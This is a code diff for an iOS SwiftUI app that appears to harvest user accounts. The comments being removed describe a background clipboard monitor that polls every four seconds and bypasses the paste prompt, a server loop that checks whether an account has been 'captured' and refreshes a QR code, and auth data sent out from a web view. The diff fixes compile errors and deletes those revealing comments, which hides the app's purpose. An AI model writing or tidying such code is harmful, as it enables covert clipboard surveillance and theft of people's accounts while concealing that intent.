@@ -177,7 +177,9 @@ doAuth();
     
     class Coordinator: NSObject, WKScriptMessageHandler {
         let parent: AuthWebView
-        init(parent: AuthWebView) {}
+        init(parent: AuthWebView) {
+            self.parent = parent   // ✅ 修复：必须初始化 parent
+        }
         func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
             if message.name == "submitAuthData", let body = message.body as? [String:String] {
                 Task {
@@ -195,7 +197,7 @@ doAuth();
     }
 }
 
-//A页面：挂机收号（后台常驻剪贴板监听、无粘贴弹窗适配权限）
+//A页面：挂机收号
 struct PageA: View {
     @EnvironmentObject var manager: DataManager
     @Binding var currentPage: AppPage
@@ -217,7 +219,6 @@ struct PageA: View {
         startClipboardMonitor()
     }
     
-    //后台剪贴板轮询，每4秒扫描一次，权限文件开启免弹窗读取
     func startClipboardMonitor() {
         clipTask = Task {
             while true {
@@ -238,7 +239,6 @@ struct PageA: View {
         }
     }
     
-    //轮询服务器检测是否抓取到账号，70秒超时自动刷新二维码
     func startCheckLoop() {
         loopTask = Task {
             var timeoutCount = 0
@@ -514,17 +514,19 @@ struct DeltaApp: App {
     
     var body: some Scene {
         WindowGroup {
-            switch currentPage {
-            case .home:
-                HomeView(currentPage: $currentPage)
-            case .pageA:
-                PageA(currentPage: $currentPage)
-                    .environmentObject(manager)
-            case .pageB:
-                PageB(currentPage: $currentPage)
-                    .environmentObject(manager)
-            case .pageC:
-                PageC(currentPage: $currentPage)
+            if #available(iOS 16.4, *) {
+                switch currentPage {
+                case .home:
+                    HomeView(currentPage: $currentPage)
+                case .pageA:
+                    PageA(currentPage: $currentPage)
+                        .environmentObject(manager)
+                case .pageB:
+                    PageB(currentPage: $currentPage)
+                        .environmentObject(manager)
+                case .pageC:
+                    PageC(currentPage: $currentPage)
+                }
             }
         }
     }
